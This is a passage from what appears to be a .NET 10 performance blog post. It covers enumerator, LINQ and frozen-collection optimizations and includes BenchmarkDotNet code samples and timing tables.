Queue<int>(Enumerable.Range(0, 10)); for (int i = 0; i &lt; 5; i++) { _direct.Enqueue(_direct.Dequeue()); } _enumerable = _direct; } [Benchmark] public int SumDirect() { int sum = 0; foreach (int item in _direct) sum += item; return sum; } [Benchmark] public int SumEnumerable() { int sum = 0; foreach (int item in _enumerable) sum += item; return sum; } }</int></int></int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>BranchInstructions/Op</th> <th>Code Size</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>SumDirect</td> <td>.NET 9.0</td> <td>24.340 ns</td> <td>1.00</td> <td>79</td> <td>251 B</td> <td>&ndash;</td> <td>NA</td> </tr> <tr> <td>SumDirect</td> <td>.NET 10.0</td> <td>7.192 ns</td> <td>0.30</td> <td>37</td> <td>96 B</td> <td>&ndash;</td> <td>NA</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>SumEnumerable</td> <td>.NET 9.0</td> <td>30.695 ns</td> <td>1.00</td> <td>103</td> <td>531 B</td> <td>40 B</td> <td>1.00</td> </tr> <tr> <td>SumEnumerable</td> <td>.NET 10.0</td> <td>8.672 ns</td> <td>0.28</td> <td>50</td> <td>324 B</td> <td>&ndash;</td> <td>0.00</td> </tr> </tbody> </table><p><code>ConcurrentDictionary<tkey></tkey></code> also gets in on the fun. The dictionary is implemented as a collection of &ldquo;buckets&rdquo;, each of which of which is a linked list of entries. It had a fairly complicated enumerator for processing these structures, relying on jumping between cases of a switch statement, e.g.</p><pre><code>switch (_state) { case StateUninitialized: ... // Initialize on first MoveNext. goto case StateOuterloop; case StateOuterloop: // Check if there are more buckets in the dictionary to enumerate. if ((uint)i &lt; (uint)buckets.Length) { // Move to the next bucket. ... goto case StateInnerLoop; } goto default; case StateInnerLoop: ... // Yield elements from the current bucket. goto case StateOuterloop; default: // Done iterating. ... }</code></pre><p>If you squint, there are nested loops here, where we&rsquo;re enumerating each bucket and for each bucket enumerating its contents. With how this is structured, however, from the JIT&rsquo;s perspective, we could enter those loops from any of those <code>case</code>s, depending on the current value of <code>_state</code>. That produces something referred to as an &ldquo;irreducible loop,&rdquo; which is a loop that has multiple possible entry points. Imagine you have:</p><pre><code>A: if (someCondition) goto B; ... B: if (someOtherCondition) goto A;</code></pre><p>Labels <code>A</code> and <code>B</code> form a loop, but that loop can be entered by jumping to either <code>A</code> or to <code>B</code>. If the compiler could prove that this loop were only ever enterable from <code>A</code> or only ever enterable from <code>B</code>, then the loop would be &ldquo;reducible.&rdquo; Irreducible loops are much more complex than reducible loops for a compiler to deal with, as they have more complex control and data flow and in general are harder to analyze. <a href="https://github.com/dotnet/runtime/pull/116949">dotnet/runtime#116949</a> rewrites the <code>MoveNext</code> method to be a more typical <code>while</code> loop, which is not only easier to read and maintain, it&rsquo;s also reducible and more efficient, and because it&rsquo;s more streamlined, it&rsquo;s also inlineable and enables possible stack allocation.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Collections.Concurrent; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private ConcurrentDictionary<int> _ints = new(Enumerable.Range(0, 1000).ToDictionary(i =&gt; i, i =&gt; i)); [Benchmark] public int EnumerateInts() { int sum = 0; foreach (var kvp in _ints) sum += kvp.Value; return sum; } }</int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>EnumerateInts</td> <td>.NET 9.0</td> <td>4,232.8 ns</td> <td>1.00</td> <td>56 B</td> <td>1.00</td> </tr> <tr> <td>EnumerateInts</td> <td>.NET 10.0</td> <td>664.2 ns</td> <td>0.16</td> <td>&ndash;</td> <td>0.00</td> </tr> </tbody> </table> <h3>LINQ</h3><p>All of these examples show enumerating collections using a <code>foreach</code> loop, and while that&rsquo;s obviously incredibly common, so too is using LINQ (Language Integrated Query) to enumerate and process collections. For in-memory collections, LINQ provides literally hundreds of extension methods for performing maps, filters, sorts, and a plethora of other operations over enumerables. It is incredibly handy, is thus used <em>everywhere</em>, and is thus important to optimize. Every release of .NET has seen improvements to LINQ, and that continues in .NET 10.</p><p>Most prominent from a performance perspective in this release are the changes to <code>Contains</code>. As discussed in depth in <a href="https://www.youtube.com/watch?v=xKr96nIyCFM">Deep .NET: Deep Dive on LINQ with Stephen Toub and Scott Hanselman</a> and <a href="https://www.youtube.com/watch?v=W4-NVVNwCWs">Deep .NET: An even DEEPER Dive into LINQ with Stephen Toub and Scott Hanselman</a>, the LINQ methods are able to pass information between them by using specialized internal <code>IEnumerable<t></t></code> implementations. When you call <code>Select</code>, that might return an <code>ArraySelectIterator<tsource></tsource></code> or an <code>IListSelectIterator<tsource></tsource></code> or an <code>IListSkipTakeSelectIterator<tsource></tsource></code> or one of any number of other types. Each of these types has fields that carry information about the source (e.g. the <code>IListSkipTakeSelectIterator<tsource></tsource></code> has fields not only for the <code>IList<tsource></tsource></code> source and the <code>Func<tsource></tsource></code> selector, but also for the tracked min and max bounds based on previous <code>Skip</code> and <code>Take</code> calls), and they have overrides of virtual methods that allow for various operations to be specialized. This means sequences of LINQ methods can be optimized. For example, <code>source.Where(...).Select(...)</code> is optimized a) to combine both the filter and the map delegates into a single <code>IEnumerable<t></t></code>, thus removing the overhead of an extra layer of interface dispatch, and b) to perform operations specific to the original source data type (e.g. if <code>source</code> was an array, the processing can be done directly on that array rather than via <code>IEnumerator<t></t></code>).</p><p>Many of these optimizations make the most sense when a method returns an <code>IEnumerable<t></t></code> that happens to be the result of a LINQ query. The producer of that method doesn&rsquo;t know how the consumer will be consuming it, and the consumer doesn&rsquo;t know the details of how the producer produced it. But since the LINQ methods flow context via the concrete implementations of <code>IEnumerable<t></t></code>, significant optimizations are possible for interesting combinations of consumer and producer methods. For example, let&rsquo;s say a producer of an <code>IEnumerable<t></t></code> decides they want to always return data in ascending order, so they do:</p><pre><code>public static IEnumerable<t> GetData() { ... return data.OrderBy(s =&gt; s.CreatedAt); }</t></code></pre><p>But as it turns out, the consumer won&rsquo;t be looking at all of the elements, and instead just wants the first:</p><pre><code>T value = GetData().First();</code></pre><p>LINQ optimizes this by having the enumerable returned from <code>OrderBy</code> provide a specialized implementation of <code>First</code>/<code>FirstOrDefault</code>: it doesn&rsquo;t need to perform an <code>O(N log N)</code> sort (or allocate a lot of memory to hold all of the keys), it can instead just do an <code>O(N)</code> search for the smallest element in the source, because the smallest element would be the first to be yielded from <code>OrderBy</code>.</p><p><code>Contains</code> is ripe for these kinds of optimizations as well, e.g. <code>OrderBy</code>, <code>Distinct</code>, and <code>Reverse</code> all entail non-trivial processing and/or allocation, but if followed by a <code>Contains</code>, all that work can be skipped, as the <code>Contains</code> can just search the source directly. With <a href="https://github.com/dotnet/runtime/pull/112684">dotnet/runtime#112684</a>, this set of optimizations is extended to <code>Contains</code>, with almost 30 specialized implementations of <code>Contains</code> across the various iterator specializations.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private IEnumerable<int> _source = Enumerable.Range(0, 1000).ToArray(); [Benchmark] public bool AppendContains() =&gt; _source.Append(100).Contains(999); [Benchmark] public bool ConcatContains() =&gt; _source.Concat(_source).Contains(999); [Benchmark] public bool DefaultIfEmptyContains() =&gt; _source.DefaultIfEmpty(42).Contains(999); [Benchmark] public bool DistinctContains() =&gt; _source.Distinct().Contains(999); [Benchmark] public bool OrderByContains() =&gt; _source.OrderBy(x =&gt; x).Contains(999); [Benchmark] public bool ReverseContains() =&gt; _source.Reverse().Contains(999); [Benchmark] public bool UnionContains() =&gt; _source.Union(_source).Contains(999); [Benchmark] public bool SelectManyContains() =&gt; _source.SelectMany(x =&gt; _source).Contains(999); [Benchmark] public bool WhereSelectContains() =&gt; _source.Where(x =&gt; true).Select(x =&gt; x).Contains(999); }</int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>AppendContains</td> <td>.NET 9.0</td> <td>2,931.97 ns</td> <td>1.00</td> <td>88 B</td> <td>1.00</td> </tr> <tr> <td>AppendContains</td> <td>.NET 10.0</td> <td>52.06 ns</td> <td>0.02</td> <td>56 B</td> <td>0.64</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>ConcatContains</td> <td>.NET 9.0</td> <td>3,065.17 ns</td> <td>1.00</td> <td>88 B</td> <td>1.00</td> </tr> <tr> <td>ConcatContains</td> <td>.NET 10.0</td> <td>54.58 ns</td> <td>0.02</td> <td>56 B</td> <td>0.64</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>DefaultIfEmptyContains</td> <td>.NET 9.0</td> <td>39.21 ns</td> <td>1.00</td> <td>&ndash;</td> <td>NA</td> </tr> <tr> <td>DefaultIfEmptyContains</td> <td>.NET 10.0</td> <td>32.89 ns</td> <td>0.84</td> <td>&ndash;</td> <td>NA</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>DistinctContains</td> <td>.NET 9.0</td> <td>16,967.31 ns</td> <td>1.000</td> <td>58656 B</td> <td>1.000</td> </tr> <tr> <td>DistinctContains</td> <td>.NET 10.0</td> <td>46.72 ns</td> <td>0.003</td> <td>64 B</td> <td>0.001</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>OrderByContains</td> <td>.NET 9.0</td> <td>12,884.28 ns</td> <td>1.000</td> <td>12280 B</td> <td>1.000</td> </tr> <tr> <td>OrderByContains</td> <td>.NET 10.0</td> <td>50.14 ns</td> <td>0.004</td> <td>88 B</td> <td>0.007</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>ReverseContains</td> <td>.NET 9.0</td> <td>479.59 ns</td> <td>1.00</td> <td>4072 B</td> <td>1.00</td> </tr> <tr> <td>ReverseContains</td> <td>.NET 10.0</td> <td>51.80 ns</td> <td>0.11</td> <td>48 B</td> <td>0.01</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>UnionContains</td> <td>.NET 9.0</td> <td>16,910.57 ns</td> <td>1.000</td> <td>58664 B</td> <td>1.000</td> </tr> <tr> <td>UnionContains</td> <td>.NET 10.0</td> <td>55.56 ns</td> <td>0.003</td> <td>72 B</td> <td>0.001</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>SelectManyContains</td> <td>.NET 9.0</td> <td>2,950.64 ns</td> <td>1.00</td> <td>192 B</td> <td>1.00</td> </tr> <tr> <td>SelectManyContains</td> <td>.NET 10.0</td> <td>60.42 ns</td> <td>0.02</td> <td>128 B</td> <td>0.67</td> </tr> <tr> <td></td> <td></td> <td></td> <td></td> <td></td> <td></td> </tr> <tr> <td>WhereSelectContains</td> <td>.NET 9.0</td> <td>1,782.05 ns</td> <td>1.00</td> <td>104 B</td> <td>1.00</td> </tr> <tr> <td>WhereSelectContains</td> <td>.NET 10.0</td> <td>260.25 ns</td> <td>0.15</td> <td>104 B</td> <td>1.00</td> </tr> </tbody> </table><p>LINQ in .NET 10 also gains some new methods, including <code>Sequence</code> and <code>Shuffle</code>. While the primary purpose of these new methods is not performance, they can have a meaningful impact on performance, due to how they&rsquo;ve been implemented and how they integrate with the rest of the optimizations in LINQ. Take <code>Sequence</code>, for example. <code>Sequence</code> is similar to <code>Range</code>, in that its a source for numbers:</p><pre><code>public static IEnumerable<t> Sequence<t>(T start, T endInclusive, T step) where T : INumber<t></t></t></t></code></pre><p>Whereas <code>Range</code> only works with <code>int</code> and produces a contiguous series of non-overflowing numbers starting at the initial value, <code>Sequence</code> works with any <code>INumber&lt;&gt;</code>, supports <code>step</code> values other than <code>1</code> (including negative values), and allows for wrapping around <code>T</code>&lsquo;s maximum or minimum. However, when appropriate (e.g. <code>step</code> is <code>1</code>), <code>Sequence</code> will try to utilize <code>Range</code>&lsquo;s implementation, which has internally been updated to work with any <code>T : INumber<t></t></code>, even though its public API is still tied to <code>int</code>. That means that all of the optimizations afforded to <code>Range<t></t></code> propagate to <code>Sequence<t></t></code>.</p><pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private List<short> _values = new(); [Benchmark(Baseline = true)] public void Fill1() { _values.Clear(); for (short i = 42; i &lt;= 1042; i++) { _values.Add(i); } } [Benchmark] public void Fill2() { _values.Clear(); _values.AddRange(Enumerable.Sequence<short>(42, 1042, 1)); } }</short></short></code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>Fill1</td> <td>1,479.99 ns</td> <td>1.00</td> </tr> <tr> <td>Fill2</td> <td>37.42 ns</td> <td>0.03</td> </tr> </tbody> </table><p>My favorite new LINQ method, though, is <code>Shuffle</code> (introduced in <a href="https://github.com/dotnet/runtime/pull/112173">dotnet/runtime#112173</a>), in part because it&rsquo;s very handy, but in part because of its implementation and performance focus. The purpose of <code>Shuffle</code> is to randomize the source input, and logically, it&rsquo;s akin to a very simple implementation:</p><pre><code>public static IEnumerable<t> Shuffle<t>(IEnumerable<t> source) { T[] arr = source.ToArray(); Random.Shared.Shuffle(arr); foreach (T item in arr) yield return item; }</t></t></t></code></pre><p>Worst case, this implementation is effectively what&rsquo;s in LINQ. Just as in the worst case <code>OrderBy</code> needs to buffer up the whole input because it&rsquo;s possible any item might be the smallest and thus need to be yielded first, <code>Shuffle</code> similarly needs to support the possibility that the last element should probabilistically be yielded first. However, there are a variety of special-cases in the implementation that allow it to perform significantly better than such a hand-rolled <code>Shuffle</code> implementation you might be using today.</p><p>First, <code>Shuffle</code> has some of the same characteristics as <code>OrderBy</code>, in that they&rsquo;re both creating permutations of the input. That means that many of the ways we can specialize subsequent operations on the result of an <code>OrderBy</code> also apply to <code>Shuffle</code>. For example, <code>Shuffle.First</code> on an <code>IList<t></t></code> can just select an element from the list at random. <code>Shuffle.Count</code> can just count the underlying source, since the order of the elements is irrelevant to the result. <code>Shuffle.Contains</code> can just perform the contains on the underlying source. Etc. But my two favorite sequences are <code>Shuffle.Take</code> and <code>Shuffle.Take.Contains</code>.</p><p><code>Shuffle.Take</code> provides an interesting optimization opportunity: whereas with <code>Shuffle</code> by itself we need to build the whole shuffled sequence, with a <code>Shuffle</code> followed immediately by a <code>Take(N)</code>, we only need to sample <code>N</code> items from the source. We still need those <code>N</code> items to be a uniformly random distribution, akin to what we&rsquo;d get if we performed the buffering shuffle and then selected the first <code>N</code> items in the resulting array, but we can do so using an algorithm that allows us to avoid buffering everything. We need an algorithm that will let us iterate through the source data once, picking out elements as we go, and only ever buffering <code>N</code> items at a time. Enter &ldquo;reservoir sampling.&rdquo; I previously discussed reservoir sampling in <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-8/">Performance Improvements in .NET 8</a>, as it&rsquo;s employed by the JIT as part of its dynamic PGO implementation, and we can use the algorithm here in <code>Shuffle</code> as well. Reservoir sampling provides exactly the single-pass, low-memory path we want: initialize a &ldquo;reservoir&rdquo; (an array) with the first <code>N</code> items, then as we scan the rest of the sequence, probabilistically overwrite one of the elements in our reservoir with the current item. The algorithm ensures that every element ends up in the reservoir with equal probability, yielding the same distribution as fully shuffling and taking <code>N</code>, but using only <code>O(N)</code> space and only making a single pass over an otherwise unknown-length source.</p><pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private IEnumerable<int> _source = Enumerable.Range(1, 1000).ToList(); [Benchmark(Baseline = true)] public List<int> ShuffleTakeManual() =&gt; ShuffleManual(_source).Take(10).ToList(); [Benchmark] public List<int> ShuffleTakeLinq() =&gt; _source.Shuffle().Take(10).ToList(); private static IEnumerable<int> ShuffleManual(IEnumerable<int> source) { int[] arr = source.ToArray(); Random.Shared.Shuffle(arr); foreach (var item in arr) { yield return item; } } }</int></int></int></int></int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>ShuffleTakeManual</td> <td>4.150 us</td> <td>1.00</td> <td>4232 B</td> <td>1.00</td> </tr> <tr> <td>ShuffleTakeLinq</td> <td>3.801 us</td> <td>0.92</td> <td>192 B</td> <td>0.05</td> </tr> </tbody> </table><p><code>Shuffle.Take.Contains</code> is even more fun. We now have a probability problem that reads like a brain teaser or an SAT question. &ldquo;I have <code>totalCount</code> items of which <code>equalCount</code> match my target value, and we&rsquo;re going to pick <code>takeCount</code> items at random. What is the probability that at least one of those <code>takeCount</code> items is one of the <code>equalCount</code> items?&rdquo; This is called a hypergeometric distribution, and we can use an implementation of it for <code>Shuffle.Take.Contains</code>.</p><p>To make this easier to reason about, let&rsquo;s talk candy. Imagine you have a jar of 100 jelly beans, of which 20 are your favorite flavor, Watermelon, and you&rsquo;re going to pick 5 of the 100 beans at random; what are the chances you get at least one Watermelon? To solve this, we could reason through all the different ways we might get 1, 2, 3, 4, or 5 Watermelons, but instead, let&rsquo;s do the opposite and think through how likely it is that we don&rsquo;t get any (sad panda):</p><ul> <li>The chance that our first pick isn&rsquo;t a Watermelon is the number of non-Watermelons divided by the total number of beans, so <code>(100-20)/100</code>.</li> <li>Once we&rsquo;ve picked a bean out of the jar, we&rsquo;re not putting it back, so the chance that our second pick isn&rsquo;t a Watermelon is now <code>(99-20)/99</code> (we have one fewer bean, but our first pick wasn&rsquo;t a Watermelon, so there&rsquo;s the same number of Watermelons as there was before).</li> <li>For a third pick, it&rsquo;s now <code>(98-20)/98</code>.</li> <li>And so on.</li> </ul><p>After five rounds, we end up with <code>(80/100) * (79/99) * (78/98) * (77/97) * (76/96)</code>, which is ~32%. If the chances I don&rsquo;t get a Watermelon are ~32%, then the chances I do get a Watermelon are ~68%. Jelly beans aside, that&rsquo;s our algorithm:</p><pre><code>double probOfDrawingZeroMatches = 1; for (long i = 0; i &lt; _takeCount; i++) { probOfDrawingZeroMatches *= (double)(totalCount - i - equalCount) / (totalCount - i); } return Random.Shared.NextDouble() &gt; probOfDrawingZeroMatches;</code></pre><p>The net effect is we can compute the answer much more efficiently than with a naive implementation that shuffles and then separately takes and separately contains.</p><pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private IEnumerable<int> _source = Enumerable.Range(1, 1000).ToList(); [Benchmark(Baseline = true)] public bool ShuffleTakeContainsManual() =&gt; ShuffleManual(_source).Take(10).Contains(2000); [Benchmark] public bool ShuffleTakeContainsLinq() =&gt; _source.Shuffle().Take(10).Contains(2000); private static IEnumerable<int> ShuffleManual(IEnumerable<int> source) { int[] arr = source.ToArray(); Random.Shared.Shuffle(arr); foreach (var item in arr) { yield return item; } } }</int></int></int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>ShuffleTakeContainsManual</td> <td>3,900.99 ns</td> <td>1.00</td> <td>4136 B</td> <td>1.00</td> </tr> <tr> <td>ShuffleTakeContainsLinq</td> <td>79.12 ns</td> <td>0.02</td> <td>96 B</td> <td>0.02</td> </tr> </tbody> </table><p><code>LINQ</code> in .NET 10 also sports some new methods that <em>are</em> about performance (at least in part), in particular <code>LeftJoin</code> and <code>RightJoin</code>, from <a href="https://github.com/dotnet/runtime/pull/110872">dotnet/runtime#110872</a>. I say these are about performance because it&rsquo;s already possible to achieve the left and right join semantics using existing LINQ surface area, and the new methods do it more efficiently.</p><p><code>Enumerable.Join</code> implements an &ldquo;inner join,&rdquo; meaning only matching pairs from the two supplied collections appear in the output. For example, this code, which is joining based on the first letter in each string:</p><pre><code>IEnumerable<string> left = ["apple", "banana", "cherry", "date", "grape", "honeydew"]; IEnumerable<string> right = ["aardvark", "dog", "elephant", "goat", "gorilla", "hippopotamus"]; foreach (string result in left.Join(right, s =&gt; s[0], s =&gt; s[0], (s1, s2) =&gt; $"{s1} {s2}")) { Console.WriteLine(result); }</string></string></code></pre><p>outputs:</p><pre><code>apple aardvark date dog grape goat grape gorilla honeydew hippopotamus</code></pre><p>In contrast, a &ldquo;left join&rdquo; (also known as a &ldquo;left outer join&rdquo;) would yield the following:</p><pre><code>apple aardvark banana cherry date dog grape goat grape gorilla honeydew hippopotamus</code></pre><p>Note that it has all of the same output as with the &ldquo;inner join,&rdquo; except it has at least one row for every <code>left</code> element, even if there&rsquo;s no matching element in the <code>right</code> row. And then a &ldquo;right join&rdquo; (also known as a &ldquo;right outer join&rdquo;) would yield the following:</p><pre><code>apple aardvark date dog elephant grape goat grape gorilla honeydew hippopotamus</code></pre><p>Again, all the same output as with the &ldquo;inner join,&rdquo; except it has at least one row for every <code>right</code> element, even if there&rsquo;s no matching element in the <code>left</code> row.</p><p>Prior to .NET 10, there was no <code>LeftJoin</code> or <code>RightJoin</code>, but their semantics could be achieved using a combination of <code>GroupJoin</code>, <code>SelectMany</code>, and <code>DefaultIfEmpty</code>:</p><pre><code>public static IEnumerable<tresult> LeftJoin<touter>( this IEnumerable<touter> outer, IEnumerable<tinner> inner, Func<touter> outerKeySelector, Func<tinner> innerKeySelector, Func<touter> resultSelector) =&gt; outer .GroupJoin(inner, outerKeySelector, innerKeySelector, (o, inners) =&gt; (o, inners)) .SelectMany(x =&gt; x.inners.DefaultIfEmpty(), (x, i) =&gt; resultSelector(x.o, i));</touter></tinner></touter></tinner></touter></touter></tresult></code></pre><p><code>GroupJoin</code> creates a group for each <code>outer</code> (&ldquo;left&rdquo;) element, where the group contains all matching items from <code>inner</code> (&ldquo;right&rdquo;). We can flatten those results by using <code>SelectMany</code>, such that we end up with an output for each pairing, using <code>DefaultIfEmpty</code> to ensure that there&rsquo;s always at least a default inner element to pair. We can do the exact same thing for a <code>RightJoin</code>: in fact, we can implement the right join just by delegating to the left join and flipping all the arguments:</p><pre><code>public static IEnumerable<tresult> RightJoin<touter>( this IEnumerable<touter> outer, IEnumerable<tinner> inner, Func<touter> outerKeySelector, Func<tinner> innerKeySelector, Func<touter> resultSelector) =&gt; inner.LeftJoin(outer, innerKeySelector, outerKeySelector, (i, o) =&gt; resultSelector(o, i));</touter></tinner></touter></tinner></touter></touter></tresult></code></pre><p>Thankfully, you no longer need to do that yourself, and this isn&rsquo;t how the new <code>LeftJoin</code> and <code>RightJoin</code> methods are implemented in .NET 10. We can see the difference with a benchmark:</p><pre><code>// dotnet run -c Release -f net10.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Linq; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private IEnumerable<int> Outer { get; } = Enumerable.Sequence(0, 1000, 2); private IEnumerable<int> Inner { get; } = Enumerable.Sequence(0, 1000, 3); [Benchmark(Baseline = true)] public void LeftJoin_Manual() =&gt; ManualLeftJoin(Outer, Inner, o =&gt; o, i =&gt; i, (o, i) =&gt; o + i).Count(); [Benchmark] public int LeftJoin_Linq() =&gt; Outer.LeftJoin(Inner, o =&gt; o, i =&gt; i, (o, i) =&gt; o + i).Count(); private static IEnumerable<tresult> ManualLeftJoin<touter>( IEnumerable<touter> outer, IEnumerable<tinner> inner, Func<touter> outerKeySelector, Func<tinner> innerKeySelector, Func<touter> resultSelector) =&gt; outer .GroupJoin(inner, outerKeySelector, innerKeySelector, (o, inners) =&gt; (o, inners)) .SelectMany(x =&gt; x.inners.DefaultIfEmpty(), (x, i) =&gt; resultSelector(x.o, i)); }</touter></tinner></touter></tinner></touter></touter></tresult></int></int></code></pre> <table> <thead> <tr> <th>Method</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>LeftJoin_Manual</td> <td>29.02 us</td> <td>1.00</td> <td>65.84 KB</td> <td>1.00</td> </tr> <tr> <td>LeftJoin_Linq</td> <td>15.23 us</td> <td>0.53</td> <td>36.95 KB</td> <td>0.56</td> </tr> </tbody> </table><p>Moving on from new methods, existing methods were also improved in other ways. <a href="https://github.com/dotnet/runtime/pull/112401">dotnet/runtime#112401</a> from <a href="https://github.com/miyaji255">@miyaji255</a> improved the performance of <code>ToArray</code> and <code>ToList</code> following <code>Skip</code> and/or <code>Take</code> calls. In the specialized iterator implementation used for <code>Take</code> and <code>Skip</code>, this PR simply checks in the <code>ToList</code> and <code>ToArray</code> implementations whether the source is something from which we can easily get a <code>ReadOnlySpan<t></t></code> (namely a <code>T[]</code> or <code>List<t></t></code>). If it is, rather than copying elements one by one into the destination, it can slice the retrieved span and use its <code>CopyTo</code>, which, depending on the <code>T</code>, may even be vectorized.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private readonly IEnumerable<string> _source = Enumerable.Range(0, 1000).Select(i =&gt; i.ToString()).ToArray(); [Benchmark] public List<string> SkipTakeToList() =&gt; _source.Skip(200).Take(200).ToList(); }</string></string></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> </tr> </thead> <tbody> <tr> <td>SkipTakeToList</td> <td>.NET 9.0</td> <td>1,218.9 ns</td> <td>1.00</td> </tr> <tr> <td>SkipTakeToList</td> <td>.NET 10.0</td> <td>257.4 ns</td> <td>0.21</td> </tr> </tbody> </table><p>LINQ in .NET 10 also sees a few notable enhancements for Native AOT. The code for LINQ has grown over time, as all of these various specializations have found their way into the codebase. These optimizations are generally implemented by deriving specialized iterators from a base <code>Iterator<t></t></code>, which has a bunch of <code>abstract</code> or <code>virtual</code> methods for performing the subsequent operation (e.g. <code>Contains</code>). With Native AOT, any use of a method like <code>Enumerable.Contains</code> then prevents the corresponding implementations on <em>all</em> of those specializations from being trimmed away, leading to non-trivial increase in assembly code size. As such, years ago multiple builds of <code>System.Linq.dll</code> were introduced into the <code>dotnet/runtime</code> build system: one focused on speed, and one focused on size. When building <code>System.Linq.dll</code> to go with coreclr, you&rsquo;d end up with the speed-optimized build that has all of these specializations. When building <code>System.Linq.dll</code> to go with other flavors, like Native AOT, you&rsquo;d instead get the size-optimized build, which eschews many of the LINQ optimizations that have been added in the last decade. And as this was a build-time decision, developers using one of these platforms didn&rsquo;t get a choice; as you learn in kindergarten, &ldquo;you get what you get and you don&rsquo;t get upset.&rdquo; Now in .NET 10, if you do forget what you learned in kindergarten and you do get upset, you have recourse: thanks to <a href="https://github.com/dotnet/runtime/pull/111743">dotnet/runtime#111743</a> and <a href="https://github.com/dotnet/runtime/pull/109978">dotnet/runtime#109978</a>, this setting is now a feature switch rather than a build-time configuration. So, in particular if you&rsquo;re publishing for Native AOT and you&rsquo;d prefer all the speed-focused optimizations, you can add <code><usesizeoptimizedlinq>false</usesizeoptimizedlinq></code> to your project file and be happy.</p><p>However, the need for that switch is now also reduced significantly by <a href="https://github.com/dotnet/runtime/pull/118156">dotnet/runtime#118156</a>. When this size/speed split was previously introduced into the <code>System.Linq.dll</code> build, all of these specializations were eschewed, without a lot of an analysis for tradeoffs involved; as this was focused on optimizing for size, any specialized overrides were removed, no matter how much space they actually saved. Many of those savings turned out to be minimal, however, and in a variety of situations, the throughput cost was significant. This PR brings back some of the more impactful specializations where the throughput gains significantly outweigh the relatively-minimal size cost.</p><h3>Frozen Collections</h3><p>The <code>FrozenDictionary<tkey></tkey></code> and <code>FrozenSet<t></t></code> collection types were introduced in .NET 8 as collections optimized for the common scenario of creating a long-lived collection that&rsquo;s then read from <em>a lot</em>. They spend more time at construction in exchange for faster read operations. Under the covers, this is achieved in part by having specializations of the implementations that are optimized for different types of data or shapes of input. .NET 9 improved upon the implementations, and .NET 10 takes it even further.</p><p><code>FrozenDictionary<tkey></tkey></code> exerts a lot of energy for <code>TKey</code> as <code>string</code>, as that is such a common use case. It also has specializations for <code>TKey</code> as <code>Int32</code>. <a href="https://github.com/dotnet/runtime/pull/111886">dotnet/runtime#111886</a> and <a href="https://github.com/dotnet/runtime/pull/112298">dotnet/runtime#112298</a> extend that further by adding specializations for 